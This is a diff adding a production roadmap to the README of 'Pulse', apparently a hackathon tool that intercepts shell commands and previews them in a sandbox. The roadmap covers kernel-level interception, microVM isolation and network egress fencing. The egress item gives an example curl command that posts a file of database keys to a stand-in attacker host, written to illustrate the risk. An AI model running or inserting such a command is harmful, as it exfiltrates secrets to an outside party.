@@ -269,3 +269,41 @@ python main.py
 - **Novelty (10%):**
   - Combining a high-level Multi-Agent Framework with a low-level Shell Sandbox is a unique approach to DevSecOps.
   - Addressing the "Human Error" root cause directly in the build pipeline is a largely unsolved problem in the open-source community.
+
+---
+
+## 10. Roadmap: From Hackathon Demo to Enterprise Product
+
+While the Pulse prototype built is highly functional and visually impressive for a hackathon, there are several architectural gaps that need to be closed before this could be sold to an enterprise as a production security tool.
+
+Here is the technical roadmap required to make Pulse a true, production-grade project:
+
+### 1. True Interception (Replacing the Custom REPL)
+**The Problem:** Currently, developers have to manually type `go run cmd/pulse/main.go` and use a custom `pulse>` shell. Developers hate changing their workflow and will simply use standard `bash` or `zsh` instead, bypassing the security. 
+**The Production Solution:**
+- **Linux:** Implement eBPF (Extended Berkeley Packet Filter). eBPF can intercept syscalls (like `execve`) directly at the Linux kernel level. This means the developer uses standard `bash`, but Pulse invisibly intercepts the command before the kernel executes it.
+- **Windows:** Use ETW (Event Tracing for Windows) or a lightweight filesystem filter driver to achieve the same kernel-level interception.
+
+### 2. Hardware Isolation (Replacing Docker)
+**The Problem:** The Ghost Agent spins up a local Docker container. Docker containers share the host's OS kernel. If a developer runs a highly sophisticated kernel-level exploit, they can "escape" the Docker container and destroy the host machine anyway. 
+**The Production Solution:**
+- Replace Docker with **Firecracker MicroVMs** (the exact tech AWS Lambda uses). Firecracker spins up a true, hardware-isolated virtual machine in a fraction of a second, ensuring absolute zero-trust execution.
+
+### 3. OS Parity (The Sandbox Environment)
+**The Problem:** Your sandbox currently strictly boots an Alpine Linux image. If a Windows developer intercepts a command like `Remove-Item C:\Temp`, it will fail inside the Alpine Linux sandbox, returning a false 0 diff. 
+**The Production Solution:**
+- The sandbox orchestrator must dynamically detect the host's operating system and boot an identical virtual machine (e.g., spinning up a Windows Server Core container for Windows users, or Ubuntu for Ubuntu users).
+
+### 4. Centralized Telemetry (Replacing Local SQLite)
+**The Problem:** The `audit.db` SQLite file lives on the individual developer's laptop (`~/.pulse/audit.db`). A company's Security Team cannot monitor the dashboard unless they physically look at the developer's screen. 
+**The Production Solution:**
+- Shift the Web Dashboard and Database to a centralized Cloud architecture (e.g., PostgreSQL on AWS).
+- The local Pulse agent on the developer's laptop should stream audit events securely via gRPC or HTTPS to the central SOC (Security Operations Center) dashboard.
+
+### 5. Network Egress Fencing
+**The Problem:** If a user accidentally runs `curl -X POST hacker.com -d @database_keys.txt`, the Docker sandbox will execute it, and the data will be exfiltrated during the preview phase. 
+**The Production Solution:**
+- The sandbox must be strictly "air-gapped" at the network layer during the `PREVIEW` phase, blocking all outbound egress traffic unless the policy explicitly allows it.
+
+### Summary
+To transition this from a prototype to a startup product, the engineering focus would shift from *"How do we simulate commands?"* to *"How do we intercept commands invisibly at the kernel level?"* and *"How do we centralize the data?"*.
